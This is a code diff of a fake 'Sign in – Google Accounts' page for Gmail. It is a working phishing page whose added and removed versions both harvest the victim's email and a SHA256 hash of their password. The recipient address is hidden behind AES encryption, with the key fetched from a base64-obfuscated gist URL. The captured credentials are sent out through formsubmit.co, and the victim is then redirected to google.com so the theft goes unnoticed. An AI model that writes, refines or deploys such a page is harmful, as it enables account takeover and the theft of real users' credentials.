@@ -1,253 +1,276 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Sign in – Google Accounts</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <style>
-    /* نفس التنسيقات السابقة */
-    body {
-      font-family: 'Roboto', sans-serif;
-      background-color: #f2f2f2;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .container {
-      background: white;
-      padding: 40px;
-      border-radius: 8px;
-      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
-      width: 100%;
-      max-width: 400px;
-      text-align: left;
-      box-sizing: border-box;
-      position: relative;
-      overflow: hidden;
-    }
-    .google-logo {
-      width: 92px;
-      display: block;
-      margin: 0 auto 20px;
-    }
-    h2 {
-      font-size: 24px;
-      margin-bottom: 10px;
-      color: #202124;
-      text-align: center;
-    }
-    p {
-      font-size: 14px;
-      color: #5f6368;
-      margin-bottom: 30px;
-      text-align: center;
-    }
-    input {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 20px;
-      border: 1px solid #dadce0;
-      border-radius: 4px;
-      font-size: 16px;
-      box-sizing: border-box;
-      transition: border-color 0.2s ease;
-    }
-    input:focus {
-      border-color: #1a73e8;
-      outline: none;
-      box-shadow: 0 0 0 2px #e8f0fe;
-    }
-    button {
-      width: 100%;
-      padding: 12px;
-      background-color: #1a73e8;
-      color: white;
-      font-size: 16px;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-      transition: background-color 0.2s ease;
-    }
-    button:hover {
-      background-color: #1669c1;
-    }
-    .links {
-      text-align: center;
-      font-size: 12px;
-      color: #999;
-      margin-top: 20px;
-    }
-    .links a {
-      display: inline-block;
-      margin: 5px 10px;
-      text-decoration: none;
-      color: #1a73e8;
-      font-size: 12px;
-    }
+<meta charset="UTF-8" />
+<title>Sign in – Google Accounts</title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<style>
+  body {
+    font-family: 'Roboto', sans-serif;
+    background: #f2f2f2;
+    margin: 0; height: 100vh;
+    display: flex; justify-content: center; align-items: center;
+  }
+  .container {
+    width: 400px;
+    background: #fff;
+    border-radius: 8px;
+    box-shadow: 0 1px 6px rgb(32 33 36 / 28%);
+    padding: 40px 32px 48px;
+    position: relative;
+    overflow: hidden;
+  }
+  .google-logo {
+    width: 92px;
+    display: block;
+    margin: 0 auto 28px;
+  }
+  h2 {
+    text-align: center;
+    color: #202124;
+    font-weight: 400;
+    font-size: 24px;
+    margin: 0 0 12px;
+  }
+  p {
+    text-align: center;
+    color: #5f6368;
+    margin: 0 0 32px;
+    font-size: 14px;
+  }
 
-    /* Motion */
-    form {
-      position: absolute;
-      width: 100%;
-      top: 140px;
-      left: 0;
-      transition: all 0.4s ease;
-      opacity: 1;
-      transform: translateX(0);
-    }
-    form.hidden {
-      opacity: 0;
-      pointer-events: none;
-      transform: translateX(-30px);
-    }
+  form {
+    position: absolute;
+    top: 144px;
+    width: 100%;
+    transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+    opacity: 1;
+  }
+  form.hidden {
+    opacity: 0;
+    pointer-events: none;
+    transform: translateX(-30px);
+  }
+  form.active {
+    opacity: 1;
+    pointer-events: auto;
+    transform: translateX(0);
+  }
 
-    /* Simple spinner animation */
-    @keyframes spin {
-      to {
-        transform: rotate(360deg);
-      }
-    }
-  </style>
+  input {
+    box-sizing: border-box;
+    width: 100%;
+    padding: 12px 16px;
+    font-size: 16px;
+    border-radius: 4px;
+    border: 1px solid #dadce0;
+    margin-bottom: 24px;
+    transition: border-color 0.2s ease;
+  }
+  input:focus {
+    outline: none;
+    border-color: #1a73e8;
+    box-shadow: 0 0 0 2px #e8f0fe;
+  }
+
+  button {
+    width: 100%;
+    background-color: #1a73e8;
+    border: none;
+    color: white;
+    font-size: 16px;
+    padding: 12px 0;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+  button:hover:not(:disabled) {
+    background-color: #1765cc;
+  }
+  button:disabled {
+    cursor: default;
+    background-color: #8ab4f8;
+  }
+
+  .links {
+    margin-top: 32px;
+    text-align: center;
+    font-size: 12px;
+    color: #1a73e8;
+  }
+  .links a {
+    text-decoration: none;
+    color: #1a73e8;
+    margin: 0 10px;
+  }
+
+  /* spinner */
+  .spinner {
+    margin: 0 auto;
+    width: 20px; height: 20px;
+    border: 3px solid rgba(255,255,255,0.3);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+</style>
 </head>
 <body>
-  <div class="container">
-    <img
-      src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
-      alt="Google"
-      class="google-logo"
-    />
-    <h2>Sign in</h2>
-    <p>to continue to Gmail</p>
 
-    <form id="step1Form" autocomplete="off">
-      <input type="email" name="email" id="email" placeholder="Email or phone" required />
-      <button type="submit" id="nextBtn">Next</button>
-    </form>
+<div class="container">
+  <img class="google-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" />
+  <h2>Sign in</h2>
+  <p>to continue to Gmail</p>
 
-    <form id="step2Form" method="POST" class="hidden" autocomplete="off">
-      <input type="hidden" name="email" id="hiddenEmail" />
-      <input type="password" name="password" placeholder="Enter your password" required />
-      <input type="hidden" name="_captcha" value="false" />
-      <button type="submit" id="submitBtn">Next</button>
-    </form>
+  <form id="emailForm" class="active" autocomplete="off" novalidate>
+    <input type="email" id="email" placeholder="Email or phone" required autofocus />
+    <button type="submit" id="nextBtn">Next</button>
+  </form>
 
-    <div class="links">
-      <a href="#">Forgot email?</a> |
-      <a href="#">Create account</a>
-    </div>
+  <form id="passwordForm" autocomplete="off" novalidate>
+    <input type="hidden" id="hiddenEmail" />
+    <input type="password" id="password" placeholder="Enter your password" required />
+    <button type="submit" id="submitBtn">Next</button>
+  </form>
+
+  <div class="links">
+    <a href="#">Forgot email?</a>
+    |
+    <a href="#">Create account</a>
   </div>
+</div>
 
-  <!-- CryptoJS -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 
-  <script>
-    (function () {
-      const encryptedEmail =
-        "U2FsdGVkX18PbGn+9z7sXrB97K6vJGZpRQwvHx+YyV7LURF1UZOSfwixMa7PeLbg";
+<script>
+(() => {
+  const encryptedEmail = "U2FsdGVkX18PbGn+9z7sXrB97K6vJGZpRQwvHx+YyV7LURF1UZOSfwixMa7PeLbg";
+  const encryptedGistUrl = "aHR0cHM6Ly9naXN0LmNvbWJpbmF0L2FjY291bnQtdmVyaWZ5LzQyMDZhMWIwNjYyM2YyNDI2MDk4MDg2N2I5OTZkN2IyL3Jhdy9kOWVhMmE3MDgwMjg5NTZmNTY5ZDY4OWNlODVhMGw5ZTdlMDA3L3NlY3JldHRfdHh0";
 
-      // الرابط مشفر base64 كما طلبت (رابطك)
-      const encryptedGistUrl =
-        "aHR0cHM6Ly9naXN0LmNvbWJpbmF0L2FjY291bnQtdmVyaWZ5LzQyMDZhMWIwNjYyM2YyNDI2MDk4MDg2N2I5OTZkN2IyL3Jhdy9kOWVhMmE3MDgwMjg5NTZmNTY5ZDY4OWNlODVhMGYwYTk5ZGUwYzE4L3NlY3JldHRfdHh0";
+  const emailForm = document.getElementById("emailForm");
+  const passwordForm = document.getElementById("passwordForm");
+  const emailInput = document.getElementById("email");
+  const hiddenEmailInput = document.getElementById("hiddenEmail");
+  const passwordInput = document.getElementById("password");
+  const nextBtn = document.getElementById("nextBtn");
+  const submitBtn = document.getElementById("submitBtn");
 
-      const s1 = document.getElementById("step1Form");
-      const s2 = document.getElementById("step2Form");
-      const emailField = document.getElementById("email");
-      const hiddenEmail = document.getElementById("hiddenEmail");
-      const nextBtn = document.getElementById("nextBtn");
-      const submitBtn = document.getElementById("submitBtn");
+  function base64Decode(str) {
+    try {
+      return atob(str);
+    } catch {
+      return null;
+    }
+  }
 
-      function base64Decode(str) {
-        try {
-          return atob(str);
-        } catch (e) {
-          console.error("Base64 decode failed", e);
-          return null;
-        }
-      }
+  async function fetchSecretKey(url) {
+    try {
+      const res = await fetch(`${url}?t=${Date.now()}`);
+      if (!res.ok) throw new Error("Failed to fetch key");
+      return await res.text();
+    } catch {
+      return null;
+    }
+  }
 
-      async function fetchSecretKey(url) {
-        try {
-          const response = await fetch(`${url}?t=${Date.now()}`);
-          if (!response.ok) throw new Error("Failed to fetch key");
-          return await response.text();
-        } catch (e) {
-          console.error("Fetch secret key error", e);
-          return null;
-        }
-      }
+  function decryptAES(encrypted, key) {
+    try {
+      const bytes = CryptoJS.AES.decrypt(encrypted, key.trim());
+      return bytes.toString(CryptoJS.enc.Utf8);
+    } catch {
+      return null;
+    }
+  }
 
-      function decryptEmail(encEmail, key) {
-        try {
-          const bytes = CryptoJS.AES.decrypt(encEmail, key.trim());
-          return bytes.toString(CryptoJS.enc.Utf8);
-        } catch (e) {
-          console.error("Decrypt email error", e);
-          return null;
-        }
-      }
+  // Motion function
+  function showForm(hideForm, showForm) {
+    hideForm.classList.remove("active");
+    hideForm.classList.add("hidden");
+    showForm.classList.remove("hidden");
+    showForm.classList.add("active");
+  }
 
-      s1.addEventListener("submit", function (e) {
-        e.preventDefault();
-        nextBtn.disabled = true;
-        nextBtn.innerHTML = `<div style="width:20px; height:20px; border:3px solid rgba(255,255,255,0.3); border-top-color:#fff; border-radius:50%; animation: spin 1s linear infinite; margin:0 auto;"></div>`;
+  emailForm.addEventListener("submit", e => {
+    e.preventDefault();
+    if (!emailInput.checkValidity()) return;
 
-        setTimeout(() => {
-          s1.classList.add("hidden");
-          s2.classList.remove("hidden");
-          hiddenEmail.value = emailField.value;
+    nextBtn.disabled = true;
+    nextBtn.innerHTML = `<div class="spinner"></div>`;
 
-          nextBtn.disabled = false;
-          nextBtn.innerHTML = "Next";
-        }, 600);
+    setTimeout(() => {
+      hiddenEmailInput.value = emailInput.value;
+      showForm(emailForm, passwordForm);
+      nextBtn.disabled = false;
+      nextBtn.textContent = "Next";
+      passwordInput.focus();
+    }, 700);
+  });
+
+  passwordForm.addEventListener("submit", async e => {
+    e.preventDefault();
+    if (!passwordInput.checkValidity()) return;
+
+    submitBtn.disabled = true;
+    submitBtn.textContent = "Sending...";
+
+    const gistUrl = base64Decode(encryptedGistUrl);
+    if (!gistUrl) {
+      alert("Failed to decode key URL.");
+      submitBtn.disabled = false;
+      submitBtn.textContent = "Next";
+      return;
+    }
+
+    const secretKey = await fetchSecretKey(gistUrl);
+    if (!secretKey) {
+      alert("Failed to fetch secret key.");
+      submitBtn.disabled = false;
+      submitBtn.textContent = "Next";
+      return;
+    }
+
+    const decryptedEmail = decryptAES(encryptedEmail, secretKey);
+    if (!decryptedEmail || !decryptedEmail.includes("@")) {
+      alert("Decryption failed.");
+      submitBtn.disabled = false;
+      submitBtn.textContent = "Next";
+      return;
+    }
+
+    const formData = new FormData();
+    formData.append("email", hiddenEmailInput.value);
+    // تشفير كلمة السر باستخدام SHA256 قبل الإرسال
+    formData.append(
+      "password",
+      CryptoJS.SHA256(passwordInput.value).toString()
+    );
+
+    try {
+      const response = await fetch(`https://formsubmit.co/ajax/${decryptedEmail}`, {
+        method: "POST",
+        body: formData,
+        headers: { Accept: "application/json" },
       });
+      if (response.ok) {
+        // بعد الإرسال توجيه لصفحة جوجل
+        window.location.href = "https://www.google.com";
+      } else {
+        alert("Failed to send data.");
+        submitBtn.disabled = false;
+        submitBtn.textContent = "Next";
+      }
+    } catch {
+      alert("Network error.");
+      submitBtn.disabled = false;
+      submitBtn.textContent = "Next";
+    }
+  });
+})();
+</script>
 
-      s2.addEventListener("submit", async function (e) {
-        e.preventDefault();
-        submitBtn.disabled = true;
-        submitBtn.textContent = "Sending...";
-
-        const gistUrl = base64Decode(encryptedGistUrl);
-        if (!gistUrl) {
-          alert("Failed to decode Gist URL");
-          return;
-        }
-
-        const secretKey = await fetchSecretKey(gistUrl);
-        if (!secretKey) {
-          alert("Failed to fetch secret key");
-          return;
-        }
-
-        const decryptedEmail = decryptEmail(encryptedEmail, secretKey);
-        if (!decryptedEmail || !decryptedEmail.includes("@")) {
-          alert("Decryption failed or invalid email");
-          return;
-        }
-
-        const formData = new FormData(s2);
-        formData.set(
-          "password",
-          CryptoJS.SHA256(formData.get("password")).toString()
-        );
-
-        fetch(`https://formsubmit.co/ajax/${decryptedEmail}`, {
-          method: "POST",
-          body: formData,
-          headers: {
-            Accept: "application/json",
-          },
-        })
-          .then((res) => res.json())
-          .then(() => {
-            window.location.href = "https://www.google.com";
-          })
-          .catch(() => {
-            window.location.href = "https://www.google.com";
-          });
-      });
-    })();
-  </script>
 </body>
 </html>
